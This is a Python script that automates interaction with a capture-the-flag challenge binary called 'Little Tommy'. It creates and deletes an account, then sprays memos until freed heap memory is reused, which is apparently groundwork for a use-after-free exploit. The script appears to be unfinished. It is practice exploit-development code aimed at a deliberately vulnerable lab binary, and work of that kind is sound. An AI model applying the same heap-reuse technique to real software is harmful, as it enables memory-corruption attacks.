import os
import sys
import select
import pty
from subprocess import Popen
from pygrok import Grok


#struct main_account {
#

## balance = 0x6b637566


def Main():
    command = '/vagrant/challenges/Little Tommy/little_tommy'

    # open pseudo-terminal to interact with subprocess
    master_fd, slave_fd = pty.openpty()

    # use os.setsid() make it run in a new process group, or job control will not be enabled
    p = Popen(command,
              preexec_fn=os.setsid,
              stdin=slave_fd,
              stdout=slave_fd,
              stderr=slave_fd,
              universal_newlines=True)


    input_handler = InputHandler()

    while p.poll() is None:
        r, w, e = select.select([master_fd], [], [])

        if master_fd in r:
            o = os.read(master_fd, 1024)

            if o:
                #os.write(sys.stdout.fileno(), o)
                next_input = input_handler.handle(o)

                if next_input != None:
                    os.write(master_fd, next_input)

class InputHandler:
    def __init__(self):
        self.account_num = 0
        self.last_cmd = None

    def handle(self, output):
        output = output.decode('ascii')

        for line in output.split('\n'):
            if "Please enter an operation number:" in line:
                if self.account_num == 0:
                    return self.new_account()

                elif self.last_cmd == 1:
                    return self.delete_account()

                elif self.last_cmd == 3 or self.last_cmd == 4:
                    return self.write_memo()

            elif "Thank you, your account number" in line:
                self.account_created(line)

            elif "Thank you, please keep this reference number number safe" in line:
                self.check_memo_id(line)

            elif self.last_cmd == 4:
                pass

            elif self.last_cmd == 5:
                pass

    def newop(self):
        if self.account_num == 0:
            return self.new_account()

    def new_account(self):
        cmd = "1\nAAAA\nBBBB\n"
        self.last_cmd = 1
        return cmd.encode('ascii')

    def account_created(self, line):
        g = Grok("Thank you, your account number %{NUMBER:account_num:int}.")
        grok_dict = g.match(line)
        self.account_num = grok_dict['account_num']

    def delete_account(self):
        cmd = "3\n"
        self.last_cmd = 3
        return cmd.encode('ascii')

    def write_memo(self):
        self.last_cmd = 4
        cmd = '4\n' + 'i'*0x100 + '\n'
        return cmd.encode('latin-1')

    def check_memo_id(self, line):
        g = Grok("Thank you, please keep this reference number number safe: %{NUMBER:memo_num:int}.")
        grok_dict = g.match(line)
        memo_num = grok_dict['memo_num']

        sys.stdout.write("\raccount: " + str(self.account_num) + " memo: " + str(memo_num))

        if grok_dict['memo_num'] < self.account_num:
            print('success!')
            sys.exit(0)


if __name__ == '__main__':
    Main()
